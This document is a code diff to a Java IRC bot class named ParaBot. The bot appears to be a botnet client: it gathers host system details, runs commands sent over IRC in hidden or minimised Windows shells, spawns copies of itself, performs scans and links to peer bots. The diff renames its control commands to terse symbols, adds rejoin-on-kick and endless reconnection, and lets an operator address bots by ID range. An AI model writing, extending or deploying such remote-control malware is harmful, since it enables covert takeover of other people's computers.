@@ -21,7 +21,7 @@ public class ParaBot extends PircBot{
 
     private final int MAX = 10;
 
-    private int port = 8080;
+    private int port = 28640;
     private int currPort = port;
 
     private Socket socket;
@@ -31,32 +31,37 @@ public class ParaBot extends PircBot{
     private ExecutorService jobs = Executors.newFixedThreadPool(MAX);
 
     private Process process;
+    private Process auxProc;
+
     private Process mainTerminal;
 
     private Future processedInput;
 
     private BufferedReader input;
     private PrintStream output;
-    private ObjectInputStream objInput;
-    private ObjectOutputStream objOut;
+    private BufferedReader objInput;
+    private PrintStream objOut;
+
+    private String channel;
 
     public String host = " system properties "+System.getProperty("os.name")+
             "  system user id "+System.getProperty("user.dir") +
             "  system operating system version "+System.getProperty("os.version") +
             "  system architecture "+System.getProperty("os.arch")+
             "  system home directory "+System.getProperty("user.home");
-    public ParaBot(){
+    public ParaBot(String channel){
         this.rand = new Random();
         this.id = rand.nextInt(100);
         byte[]bytes = new byte[7];
         rand.nextBytes(bytes);
-        this.name = new String(bytes, Charset.forName("UTF-8"));
-        this.setName("B"+name.hashCode()+"T");
+        this.name = "B"+new String(bytes, Charset.forName("UTF-8")).hashCode()+"T";
+        this.setName(name);
+        this.channel = channel;
     }
     public boolean spawnClone(){
         try{
             Runnable clone = ()->{
-                String command = "javac -classpath pircbot.jar;. *.java && javaw -classpath pircbot.jar; TestBotMain main";
+                String command = "javac -classpath pircbot.jar;. *.java && java -classpath pircbot.jar; TestBotMain main && exit";
                 terminalCommander(command,false);
             };
             jobs.submit(clone);
@@ -66,40 +71,36 @@ public class ParaBot extends PircBot{
         }
         return false;
     }
-    public boolean initiateClient(int port){
+    public boolean initiateP2P(String location,int port){
         try{
-            socket = new Socket("localhost",port);
-            input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-            output = new PrintStream(socket.getOutputStream());
+            objSocket = new Socket(location,port);
+            objInput = new BufferedReader(new InputStreamReader(objSocket.getInputStream()));
+            objOut = new PrintStream(objSocket.getOutputStream());
+        }catch(BindException e){
+            initiateClient(port+1);
         }catch(IOException e){
             e.printStackTrace();
             System.out.println("Error initiating client");
         }
         return false;
     }
-    public void sendProcess(final String command){
-       try{
+    public boolean initiateClient(int port){
+        try{
+            socket = new Socket("localhost",port);
+            input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+            output = new PrintStream(socket.getOutputStream());
+        }catch(BindException e){
+            initiateClient(port+1);
+        }catch(IOException e){
+            e.printStackTrace();
+            System.out.println("Error initiating client");
+        }
+        return false;
+    }
 
-           Callable<String>serverJob = ()->{
-               String[]toDo = {"cmd","/C","start",command};
-
-               tellServer("process");
-               int port = 9879;
-               objSocket = new Socket("localhost",port);
-               objOut = new ObjectOutputStream(objSocket.getOutputStream());
-               objOut.writeObject(toDo);
-               objInput = new ObjectInputStream(objSocket.getInputStream());
-               String response = objInput.readUTF();
-
-               objInput.close();
-               objOut.close();
-               //objSocket.close();
-               return response;
-           };
-           processedInput = jobs.submit(serverJob);
-       }catch(Exception e){
-           e.printStackTrace();
-       }
+    public boolean connectToFriends(String location,int port){
+        initiateP2P(location,port);
+        return objSocket.isConnected();
     }
     public boolean initiateServer(String type){
         if(currPort != port){
@@ -107,7 +108,7 @@ public class ParaBot extends PircBot{
         }
 
         String id = Integer.toString(this.id);
-        String command = "java -classpath .;. Server "+id+" "+port++ +" "+type;
+        String command = "java -classpath .;. Server "+id+" "+port++ +" "+type+" && exit";
         process = terminalCommander(command,false);
         initiateClient(currPort);
         return socket.isConnected();
@@ -144,7 +145,7 @@ public class ParaBot extends PircBot{
     public Process terminalCommander(String command,boolean suppress){
         try{
 
-            String start = suppress == true?"cmd /c start /B cmd.exe":"cmd /c start cmd.exe";
+            String start = suppress == true?"cmd /c start /B cmd.exe":"cmd /c start /MIN cmd.exe";
             String cmd = " /K \""+command+"\"";
 
             Process process = Runtime.getRuntime().exec(start+cmd);
@@ -155,10 +156,25 @@ public class ParaBot extends PircBot{
         return null;
     }
     public void handlePersonalCommand(String channel,String sender,String command){
-        if(command.contains("#init")){
+        if(command.split(" ")[0].equalsIgnoreCase("#:")){//initialize
             Boolean success = initiateServer("server");
             sendMessage(channel,sender+" initiated server "+success);
             sendMessage(channel,sender+"address "+socket.getRemoteSocketAddress()+" local port "+socket.getLocalPort());
+        }
+        if(command.split(" ")[0].equalsIgnoreCase("#-")){//p2p
+           String[]split = command.split(" ");
+           String location = split[1];
+           int where = Integer.parseInt(split[2]);
+           sendMessage(channel,sender+" connection was "+connectToFriends(location,where));
+        }
+        if(command.split(" ")[0].equalsIgnoreCase("#$")){//speak to other
+            String[] list = command.split(" ");
+            String who = list[1];
+            String toDo = "";
+            for(int i=2;i<list.length;i++){
+                toDo += list[i]+" ";
+            }
+            sendMessage(channel,"#>> "+who+" "+toDo);
         }
         if(command.split(" ")[0].equalsIgnoreCase("#getProcess")){
             StringBuffer buff = new StringBuffer();
@@ -203,7 +219,7 @@ public class ParaBot extends PircBot{
             performScan(command.split(" ")[1]);
             sendMessage(channel,sender+" scan done");
         }
-        if(command.split(" ")[0].equalsIgnoreCase("#clone")){
+        if(command.split(" ")[0].equalsIgnoreCase("#./")){//clone
             sendMessage(channel,sender+" spawned clone "+spawnClone());
         }
         if(command.split(" ")[0].equalsIgnoreCase("#command")){
@@ -214,17 +230,17 @@ public class ParaBot extends PircBot{
             }
             useTerminal(buff.toString());
         }
-        if(command.split(" ")[0].equalsIgnoreCase("#sendProcess")){
+        if(command.split(" ")[0].equalsIgnoreCase("#@f")){//tell friends server
             StringBuffer buff = new StringBuffer();
             String[]cmd = command.split(" ");
             for(int i=1;i<cmd.length;i++){
-                buff.append(cmd[i]);
+                buff.append(cmd[i]+" ");
             }
-            sendProcess(cmd.toString());
-            sendMessage(channel,sender+" process sent");
+            String ret = tellFriend(buff.toString());
+            sendMessage(channel,sender+" message sent");
+            sendMessage(channel,sender+" server response:"+ret);
         }
-
-        if(command.split(" ")[0].equalsIgnoreCase("#tell")){
+        if(command.split(" ")[0].equalsIgnoreCase("#@")){//tell own server
             StringBuffer buff = new StringBuffer();
             String[]cmd = command.split(" ");
             for(int i=1;i<cmd.length;i++){
@@ -234,6 +250,19 @@ public class ParaBot extends PircBot{
             sendMessage(channel,sender+" message sent");
             sendMessage(channel,sender+" server response:"+ret);
         }
+    }
+    public String tellFriend(String message){
+        try{
+            String remove = "#tell";
+            String line = message.substring(0);
+            objOut.println(line);
+            String response = objInput.readLine();
+            objOut.flush();
+            return response;
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+        return "no response";
     }
     public String tellServer(String message){
         try{
@@ -248,32 +277,65 @@ public class ParaBot extends PircBot{
         }
         return "no response";
     }
+    public void onKick(String channel, String kickerNick, String kickerLogin, String kickerHostname, String recipientNick, String reason){
+        if(recipientNick.equalsIgnoreCase(getNick())){
+            joinChannel(this.channel);
+        }
+    }
     public void onDisconnect(){
         int count = 0;
-        while(!isConnected() && count < 20){
+        while(!isConnected()){
             try{
-                reconnect();
+                joinChannel(this.channel);
+                count++;
             }catch(Exception e){
                 e.printStackTrace();
             }
         }
+        System.exit(0);
     }
     public void onMessage(String channel,String sender,String login,String hostName,String message) {
         if (message.equalsIgnoreCase("#time")) {
             String time = new java.util.Date().toString();
             sendMessage(channel, sender+" the current Time is " + time);
         }
-        if(message.equalsIgnoreCase("#identify")){
+        if(message.equalsIgnoreCase("#?")){//identify
             sendMessage(channel,sender+" ID="+id);
         }
-        if(message.split(" ")[0].equalsIgnoreCase("#call")){
+        if(message.equalsIgnoreCase("#all")){
+            StringBuffer all = new StringBuffer();
+            for(int i=1;i<message.split(" ").length;i++){
+                ///all.append(message.split(" ")[i]+" ");
+            }
+        }
+        if(message.split(" ")[0].equalsIgnoreCase("#>>")){//talk to individual(s)
             String[] input = message.split(" ");
             StringBuffer command = new StringBuffer();
-            if(input[1].equalsIgnoreCase(Integer.toString(id))){
+            if(input[1].split("-").length > 1 ){
+                String[] range = input[1].split("-");
+                int start = Integer.parseInt(range[0]);
+                int end = Integer.parseInt(range[1]);
+                if(id >= start && id <= end){
+                    for(int i=2;i<input.length;i++){
+                        command.append(input[i]+" ");
+                    }
+                    if(command.toString().split(" ")[0].equalsIgnoreCase("#close")){
+                        try{
+                            disconnect();
+                            output.close();
+                            System.exit(0);
+                        }catch(Exception e){
+                            e.printStackTrace();
+                        }
+                    }else{
+                        handlePersonalCommand(channel,sender, command.toString());
+                    }
+                }
+            }else if(input[1].equalsIgnoreCase(Integer.toString(id))){
                 for(int i=2;i<input.length;i++){
                     command.append(input[i]+" ");
                 }
-                if(command.toString().contains("#close")){
+                if(command.toString().split(" ")[0].equalsIgnoreCase("#close")){
                     try{
                         disconnect();
                         output.close();
